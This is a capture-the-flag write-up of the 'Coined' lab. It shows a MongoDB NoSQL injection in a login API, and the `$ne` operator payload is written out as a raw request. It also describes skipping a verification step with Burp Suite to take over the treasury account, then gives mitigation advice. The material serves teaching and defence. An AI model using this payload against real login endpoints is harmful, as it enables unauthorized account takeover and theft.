---
title: "NoSQL Injection Leads to Treasury Account Takeover | Coined"
date: 2026-06-09 22:00:00 +0530
categories: [A05 - Injection, NoSQL Injection]
tags: [nosql-injection, mongodb, authentication-bypass, privilege-escalation, webverselabs-pro, coined]
author: Shivansh Sharma
image:
path: /assets/images/posts/coined-nosql-injection-authentication-bypass.webp
alt: Coined NoSQL Injection Authentication Bypass
-------------------------------------------------

## Lab Link

Lab: [Coined](https://dashboard.webverselabs-pro.com/mystery-challenges/coined)

## Overview

Coined is a cryptocurrency exchange whose treasury account controls access to a high-value recovery phrase stored within a secure Vault.

During testing, the login API was found to be vulnerable to NoSQL Injection. By supplying MongoDB operators instead of normal credentials, it was possible to bypass authentication and gain access to the treasury account.

## Objective

Bypass authentication, access the treasury account, and retrieve the Vault recovery phrase.

## Vulnerability Identification

### Classification Hierarchy

```text
A05 - Injection
└── NoSQL Injection
    └── Authentication Bypass
        └── Account Takeover
```

The login endpoint accepted user-controlled JSON objects and failed to validate MongoDB query operators.

## Reconnaissance

The application exposes a login page:

```bash
/login
```

Intercepting the authentication request revealed:

```http
POST /api/login
```

The API accepted JSON input containing email and password fields.

Because the backend appeared to use MongoDB-style queries, NoSQL operator injection became a likely attack vector.

## Exploitation

Instead of supplying normal credentials, the login request was modified to use MongoDB comparison operators.

```json
{
  "email": {
    "$ne": null
  },
  "password": {
    "$ne": null
  }
}
```

Modified request:

```http
POST /api/login
Content-Type: application/json

{"email":{"$ne":null},"password":{"$ne":null}}
```

The server responded with:

```json
{
  "next": "/verify",
  "ok": true
}
```

This indicated that authentication had been successfully bypassed.

## Authentication Bypass

After the successful login response, the application attempted to redirect the user to:

```http
GET /verify
```

Keeping Burp Suite interception enabled revealed the verification request.

The request path was modified from:

```http
GET /verify
```

to:

```http
GET /
```

The modified request was forwarded.

Returning to the application and navigating to the dashboard revealed that the session was now authenticated as:

```text
treasury@coined.io
```

The account takeover was successful.

## Proof of Exploitation

With access to the treasury account, the Vault functionality became available.

Navigate to:

```http
GET /vault
```

The Vault contained the recovery phrase required to complete the challenge.

Response:

```text
WEBVERSE{REDACTED}
```

The challenge is successfully solved.

## Root Cause Analysis

The login API failed to validate user-supplied JSON input before constructing database queries.

MongoDB operators such as:

```json
{
  "$ne": null
}
```

were accepted directly from the client and incorporated into the authentication query.

As a result, the database searched for any account where the email and password fields were not null, allowing authentication checks to be bypassed entirely.

The application subsequently trusted the authenticated session and granted access to the treasury account.

## Impact

Successful exploitation allows attackers to:

* Bypass authentication
* Access arbitrary user accounts
* Impersonate privileged users
* Access sensitive financial information
* Perform unauthorized actions
* Compromise administrative functionality

Severity: **Critical**

## Mitigation

To prevent NoSQL Injection vulnerabilities:

* Validate and sanitize all user input
* Reject MongoDB operators supplied by clients
* Enforce strict schema validation
* Convert user input to expected primitive types
* Use parameterized query patterns
* Implement server-side authorization checks

Example validation:

```javascript
const email = String(req.body.email);
const password = String(req.body.password);
```

Reject objects where strings are expected.

## Real-World Insight

NoSQL Injection vulnerabilities became increasingly common as MongoDB adoption grew across web applications. Unlike traditional SQL Injection, attackers abuse database operators such as `$ne`, `$gt`, `$regex`, and `$exists` to manipulate backend queries.

Authentication endpoints are particularly attractive targets because a single injection flaw can lead directly to account takeover and privilege escalation.

Coined demonstrates how insufficient validation of JSON-based login parameters can allow attackers to bypass authentication and gain access to highly privileged accounts.
